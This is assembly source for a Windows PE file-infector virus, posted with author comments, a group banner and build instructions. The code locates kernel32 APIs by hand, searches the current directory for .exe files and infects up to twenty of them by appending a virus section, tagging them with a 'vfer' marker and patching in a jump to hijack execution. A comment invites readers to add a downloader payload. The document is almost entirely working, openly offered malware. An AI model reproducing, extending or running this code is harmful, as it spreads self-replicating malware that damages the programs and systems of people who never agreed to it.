   ;   First of all i must be sorry for my bad english
   ;   This is a simple virus and you can modify what you want
   ;   In fact  the following code just a part of my virus ,because of it's spreading.
   ;   That, i add code which could spread via USB Disk, WebPage.
   ;   OK, now i wish you could enjoy my code,thank you
   ;
   ;ml /c /Cp /coff virus.asm
   ;link /subsystem:windows /section:.text,wre virus
   ;
   ;
   ;  ,         /  \'''````
   ;   ,        |  |           ,,_   '     ..
   ;   |        |  |        /``   \   \  /
   ;    \      /  /        /      |   \  `
   ;    |     /   / ,-`\   '   _. `    |
   ;     \   /   |-`       | ``        |
   ;      ,  |  /          \            ,
   ;      |  |  |           |           |
   ;      \ |   |            \          |
   ;       \|   |             `''''''   |
   ;            |                       |
   ;            |                       \
   ;            \
   ;   Group/Team :        W.S.T
   ;   WebSite    :    http://www.wolvez.org/Forum
   ;  Welcome to W.S.T          ^-^
   .586p
   .model flat, stdcall
   .CODE
   VirusMain:
   VirusStart:
           call   GetDeltaPointer
   GetDeltaPointer:
           mov     ebp,dword ptr [esp]
           add     esp,4
           sub ebp, offset GetDeltaPointer

   GetKernelBase:
           mov eax,[esp]
           and eax,0ffff0000h
       check:
           cmp word ptr [eax],5A4Dh;
           jz checkpe
           sub eax,10000h
           jmp check       ;
       checkpe:
           mov [ebp+Kernel32Address],eax
           add eax,[eax+3ch];
           cmp word ptr [eax],4550h
           jnz   error_Final
           jmp Begin
   APIS:
           szCloseHandle           db 'CloseHandle',0
           _CloseHandle            dd 0
           szCreateFileA           db 'CreateFileA',0
           _CreateFileA            dd 0
           szCreateFileMappingA    db 'CreateFileMappingA',0
           _CreateFileMappingA     dd 0
           szSetFileAttributesA    db 'SetFileAttributesA',0
           _SetFileAttributesA     dd 0
           szMapViewOfFile         db 'MapViewOfFile',0
           _MapViewOfFile          dd 0
           szSetEndOfFile          db 'SetEndOfFile',0
           _SetEndOfFile           dd 0
           szSetFilePointer        db 'SetFilePointer',0
           _SetFilePointer         dd 0
           szUnmapViewOfFile       db 'UnmapViewOfFile',0
           _UnmapViewOfFile        dd 0
           szExitProcess           db 'ExitProcess',0
           _ExitProcess            dd 0
           szGetFileSize           db 'GetFileSize',0
           _GetFileSize            dd 0
           szGetModuleHandle       db 'GetModuleHandle',0
           _GetModuleHandle        dd  0
           szFindClose             db 'FindClose',0
           _FindClose              dd  0
           szFindFirstFileA        db 'FindFirstFileA',0
           _FindFirstFileA         dd 0
           szFindNextFileA         db 'FindNextFileA',0
           _FindNextFileA          dd 0
           szSetCurrentDirectoryA  db 'SetCurrentDirectoryA',0
           _SetCurrentDirectoryA   dd 0
           szGetCurrentDirectoryA  db 'GetCurrentDirectoryA',0
           _GetCurrentDirectoryA   dd 0
   DATAS:
           WriteAddr           dd 0
           Fir_Sec_Addr        dd 0
           Cur_Sec_Addr        dd 0
           SetJmpOepsize       dd  (offset SetJmpOepEnd - offset SetJmpOep)   ;hehe   a joke
           Now_Sec_Addr        dd 0
           OepData             dd 0
   WIN32_FIND_DATA  STRUC
           FileAttributes      dd 0
           CreateTime          dq 0
           LastAccessTime      dq 0
           LastWriteTime       dq 0
           FileSizeHigh        dd 0
           FileSizeLow         dd 0
           Reserved0           dd 0
           Reserved1           dd 0
           FullFileName        db 260 dup(0)
           AlternateFileName   db 14 dup(0)
   WIN32_FIND_DATA  ENDS
   win32_find_data  WIN32_FIND_DATA  <>

           Kernel32Address DD 0
           AppStart        dd 0
           Vlen            dd (offset VirusEnd- offset VirusStart)
           ImageBase       dd 0
           HFcreatefilemapping dd 0
           HFmapviewoffile     dd 0
           sec_align       dd 0
           file_align      dd 0
           oldEnd          dd 0
           oldEip          dd 0
           NewIp           dd 0
           PE_Head         dd 0
           FileHandle      dd 0
           InfectNumber    dd 0
           HFileFind       dd 0
           SearchString    db '*.exe',0
   Begin:
       GetAPIAddr:
           lea esi,[ebp+szSetFileAttributesA]
           call GetFunctionAddress
           mov [ebp+_SetFileAttributesA],eax

           lea esi,[ebp+szCloseHandle]
           call GetFunctionAddress
           mov [ebp+_CloseHandle],eax

           lea esi,[ebp+szCreateFileA]
           call GetFunctionAddress
           mov [ebp+_CreateFileA],eax

           lea esi,[ebp+szCreateFileMappingA];
           call GetFunctionAddress
           mov [ebp+_CreateFileMappingA],eax

           lea esi,[ebp+szMapViewOfFile]
           call GetFunctionAddress
           mov [ebp+_MapViewOfFile],eax

           lea esi,[ebp+szSetEndOfFile]
           call GetFunctionAddress
           mov [ebp+_SetEndOfFile],eax

           lea esi,[ebp+szSetFilePointer]
           call GetFunctionAddress
           mov [ebp+_SetFilePointer],eax

           lea esi,[ebp+szUnmapViewOfFile]
           call GetFunctionAddress
           mov [ebp+_UnmapViewOfFile],eax

           lea esi,[ebp+szExitProcess]
           call GetFunctionAddress
           mov [ebp+_ExitProcess],eax

           lea     esi, [ebp+szFindFirstFileA]
           call    GetFunctionAddress
           mov     [ebp+_FindFirstFileA], eax

           lea     esi, [ebp+szFindNextFileA]
           call    GetFunctionAddress
           mov     [ebp+_FindNextFileA], eax

           lea     esi,[ebp+szFindClose]
           call     GetFunctionAddress
           mov     [ebp+_FindClose],eax

           lea     esi,[ebp+szGetFileSize];
           call    GetFunctionAddress
           mov     [ebp+_GetFileSize],eax

           lea     esi,[ebp+szGetModuleHandle]
           call    GetFunctionAddress
           mov     [ebp+_GetModuleHandle],eax

   @Next:
           push 0
           call [ebp+_GetModuleHandle]
           test eax,eax
           jz error_Final
           add eax,[eax+3ch]
           cmp dword ptr [eax+08h],'vfer'
           jz GoToWork

           mov dword ptr [ebp+InfectNumber],20
           call SearchFiles;
           jmp @Exit
   InfectFiles:
           lea esi,[ebp+win32_find_data.FullFileName];
           push 80H
           push esi
           call [ebp+_SetFileAttributesA]
           call OpenFile
           mov [ebp+FileHandle],eax
           inc eax
           test eax,eax
           jz error_Final

           mov ecx,dword ptr [ebp+win32_find_data.FileSizeLow]
           add ecx,01000h
           push ecx

           call CreateMap
           test eax,eax
           jz error_CreateMap
           mov [ebp+HFcreatefilemapping],eax;

           pop ecx
           call MapFile
           test eax,eax
           jz error_MapFile
           mov [ebp+HFmapviewoffile],eax
       Injection:
           xchg esi,eax
           cmp word ptr [esi],5A4Dh;
           jnz error_MapFile
           add esi,[esi+3ch];
           cmp word ptr [esi],4550h
           jnz error_MapFile
           cmp dword ptr [esi+08h],'vfer'
           jz  @Close                      ;has  been infect

           mov [ebp+PE_Head],esi
           push    0h
           pop     dword ptr [esi+0d0h]
           push    0h
           pop     dword ptr[esi+0d4h]
           mov     ebx, dword ptr[esi+38h]
           mov     [ebp+sec_align],ebx
           mov     edi,dword ptr [esi+3ch]
           mov     [ebp+file_align],edi
           mov     ebx,dword ptr [esi+28h]
           add     ebx,[esi+34h]
           mov     [ebp+oldEip],ebx
           movzx ebx,word ptr [esi+14h];
           lea eax,[esi+ebx+18h];
           xchg    esi,eax
           mov dword ptr [ebp+Fir_Sec_Addr],esi
   ;****************************************************************************************************************************
   ;First i check if program had been packed
   ;*******************************************************************************************************************************
       RandNum:
           RDTSC;
           and eax,00000002h;
           xchg eax,ecx

           imul ecx,ecx,28h;
           add esi,ecx;;
           mov dword ptr [ebp+Cur_Sec_Addr],esi
           mov ebx,dword ptr [esi+08h];
           mov edx,dword ptr [esi+0ch];
           add edx,ebx
           mov dword ptr [ebp+OepData],edx;
           mov edx,dword ptr [esi+10h];
           sub edx,dword ptr [esi+08h];
           js  error_MapFile          ;
           mov edi,dword ptr [esi+14h];
           add edi,dword ptr [esi+08h]
           add edi,dword ptr [ebp+HFmapviewoffile];
           sub edx,5
       RandData:
           push edx
           RDTSC
           pop edx
           AND eax,edx
           test eax,eax
           jz RandData
           mov edx,dword ptr [ebp+OepData]
           add edx,eax
           mov dword ptr[ebp+OepData],edx
           add edi,eax
           mov dword ptr [ebp+WriteAddr],edi
           cmp dword ptr [edi],00000000h
           jnz  error_MapFile
   ;***********************************************************
   ; ok if the program hadnt packed  i append a section
   ;**************************************************************
           mov    esi,dword ptr [PE_Head]
           movzx   ecx,word ptr[esi+06h]               ;
           inc word ptr [esi+06h]
           imul ecx,ecx,28h                            ;
           mov esi,dword ptr [ebp+Fir_Sec_Addr]
           add esi,ecx
           mov dword ptr [ebp+Now_Sec_Addr],esi
           mov dword ptr[esi],'    '
           mov ebx,dword ptr[ebp+Vlen]
           mov dword ptr [esi+08h],ebx
           mov dword ptr [esi+24h],0e0000020h
           mov eax,dword ptr [esi-28h+08h]             ;
           mov ebx,dword ptr[ebp+sec_align]
           cmp eax,ebx
           xor ecx,ecx
           jb @1
       @@@@1:
           push eax
           sub eax,ebx
           js @@@@2
           inc ecx
           pop eax
           sub eax,dword ptr [ebp+sec_align]
           jmp @@@@1
       @@@@2:
           pop eax
           inc ecx
           mov eax,dword ptr [ebp+sec_align]
           mul ecx
           xchg eax,ebx
        @1:
           add ebx,dword ptr [esi-28h+0ch]
           mov dword ptr [esi+0ch],ebx
       @@1:
           mov dword ptr [ebp+NewIp],ebx
           mov eax,dword ptr [ebp+Vlen]
           mov ebx,dword ptr [ebp+file_align];
           xor ecx,ecx
           cmp eax,ebx
           jb @2
       @@@@3:
           push eax
           sub eax,ebx
           js @@@@4
           inc ecx
           pop eax
           sub eax,dword ptr [ebp+file_align]
           jmp @@@@3
       @@@@4:
           pop eax
           inc ecx
           mov eax,dword ptr [ebp+file_align]
           mul ecx
           xchg eax,ebx
       @2:
           mov dword ptr [esi+10h],ebx
       @@2:
           mov eax,dword ptr [esi-28h+14h]
           mov ebx,dword ptr [esi-28h+10h]
           add eax,ebx
           mov dword ptr [esi+14h],eax
           mov     [ebp+oldEnd],eax                ;
   ;******************************************************************************************************************************************************
   ;Here  i set "JMP xxxxxxxx" in the space  where alway no data in it
   ; however, you also can set other data or code in it if the area have enough space
   ;******************************************************************************************************************************************************
   RandSetData:

           mov edi,dword ptr [ebp+WriteAddr]       ; haha  a joke
           mov esi,offset SetJmpOep
           mov ecx,[ebp+SetJmpOepsize]
           cld
           rep movsb
           mov edx,dword ptr [ebp+OepData]
           add edx,5
           mov esi,dword ptr [ebp+Now_Sec_Addr]
           mov ebx,dword ptr [esi+0ch]
           sub ebx,edx
           mov dword ptr [edi],ebx

           mov     eax,dword ptr [ebp+PE_Head]
           mov     ebx,dword ptr [ebp+OepData]
           mov     dword ptr [eax+28h],ebx
           mov     ebx,[eax+50h]
           add     ebx,[ebp+Vlen]
           mov     ecx,[ebp+sec_align]
           xor     edx,edx
           xchg    eax,ebx
           cdq
           div     ecx
           test    edx,edx
           je  @@@4
           inc     eax
       @@@4:
           mul     ecx
           xchg    eax,ebx
           mov     [eax+50h],ebx
           mov dword ptr [eax+8h],'vfer'
           cld
           mov ecx,[ebp+Vlen]
           mov     edi,[ebp+oldEnd]
           add     edi,[ebp+HFmapviewoffile]
           lea     esi,[ebp+VirusStart]
           rep     movsb
           xor     eax,eax
           sub     edi,[ebp+HFmapviewoffile]

           push    0h
           push    0h
           push    edi
           push    [ebp+FileHandle]
           call    [ebp+_SetFilePointer]

           push    [ebp+FileHandle]
           call    [ebp+_SetEndOfFile]
   @Close:
           call UnMapFile
           call UnCreateMap
           call UnOpenFile
           ret
   ;*****************************************************THE  END ********************************************************************************
   GetFunctionAddress PROC
           mov     eax, [ebp+Kernel32Address]          ;EAX = Kernel32 Address
           mov     ebx, [eax+3Ch]
           add     ebx, eax
           add     ebx, 120
           mov     ebx, [ebx]
           add     ebx, eax                            ;EBX = Export Address

           xor     edx, edx
           mov     ecx, [ebx+32]
           add     ecx, eax
           push    esi
           push    edx
   CompareNext:
           pop     edx
           pop     esi
           inc     edx
           mov     edi, [ecx]
           add     edi, eax
           add     ecx, 4
           push    esi
           push    edx
   CompareName:
           mov     dl, [edi]
           mov     dh, [esi]
           cmp     dl, dh
           jne     CompareNext
           inc     edi
           inc     esi
           cmp     byte ptr [esi], 0
           je      GetAddress
           jmp     CompareName
   GetAddress:
           pop     edx
           pop     esi
           dec     edx
           shl     edx, 1
           mov     ecx, [ebx+36]
           add     ecx, eax
           add     ecx, edx
           xor     edx, edx
           mov     dx, [ecx]
           shl     edx, 2
           mov     ecx, [ebx+28]
           add     ecx, eax
           add     ecx, edx
           add     eax, [ecx]
           ret
   GetFunctionAddress ENDP
   MapFile proc
           xor     eax,eax
           push    ecx
           push    eax
           push    eax
           push    00000002h
           push    dword ptr [ebp+HFcreatefilemapping]
           call    [ebp+_MapViewOfFile]
           ret
   MapFile endp

   CreateMap proc
           xor     eax,eax
           push    eax
           push    ecx
           push    eax
           push    00000004h
           push    eax
           push    dword ptr [ebp+FileHandle]
           call    [ebp+_CreateFileMappingA]
           ret
   CreateMap endp
   SearchFiles proc
       lea eax, [ebp+win32_find_data]
       lea ebx, [ebp+SearchString]

       push    eax
       push    ebx
       Call    [ebp+_FindFirstFileA]
       inc eax
       jz      SearchClose
       dec eax
       mov dword ptr [ebp+HFileFind],eax

   CompareFileSizeHigh:
       cmp [ebp+win32_find_data.FileSizeHigh],0
       jne SearchNext
       call    InfectFiles
       dec     [ebp+InfectNumber]
       cmp     [ebp+InfectNumber],0
       je  SearchHandleClose

   SearchNext:
       push    ebp
       lea     eax,  [ebp+win32_find_data]
       push    eax
       mov     eax,dword ptr [ebp+HFileFind]
       push    eax
       call    [ebp+_FindNextFileA]
       pop     ebp
       cmp     eax,0
       je  SearchHandleClose
       jmp     CompareFileSizeHigh

   SearchHandleClose:
       push    ebp
       push    dword ptr[ebp+HFileFind]
       call    [ebp+_FindClose]
       pop     ebp

   SearchClose:
       ret
   SearchFiles endp
   OpenFile proc
           xor     eax,eax
           push    eax
           push    eax
           push    00000003h
           push    eax
           inc     eax
           push    eax
           push    80000000h or 40000000h
           push    esi
           call    [ebp+_CreateFileA]
           ret
   OpenFile endp

   SetJmpOep:
           db 0E9h
   SetJmpOepEnd:
   UnMapFile  proc
           push    [ebp+HFmapviewoffile]
           call    [ebp+_UnmapViewOfFile]
           ret
   UnMapFile  endp
   UnCreateMap proc
           push [ebp+HFcreatefilemapping]
           call [ebp+_CloseHandle];
           ret
   UnCreateMap endp
   UnOpenFile  proc
           push    [ebp+FileHandle]
           call    [ebp+_CloseHandle]
           ret
   UnOpenFile  endp
   GoToWork:
   ;***********************************************************************HERE***********************************************************************
   ;you can add your own code    ^-^  such as downloader or others
   ;***************************************************************************************************************************************************
           mov eax,dword ptr[ebp+oldEip]
           jmp eax
   error_MapFile:
           call UnMapFile
   error_CreateMap:
           call UnCreateMap
   error_Final:
           call UnOpenFile
           ret
   @Exit:
           push 0h
           call [ebp+_ExitProcess];
   VirusEnd:
       end VirusMain
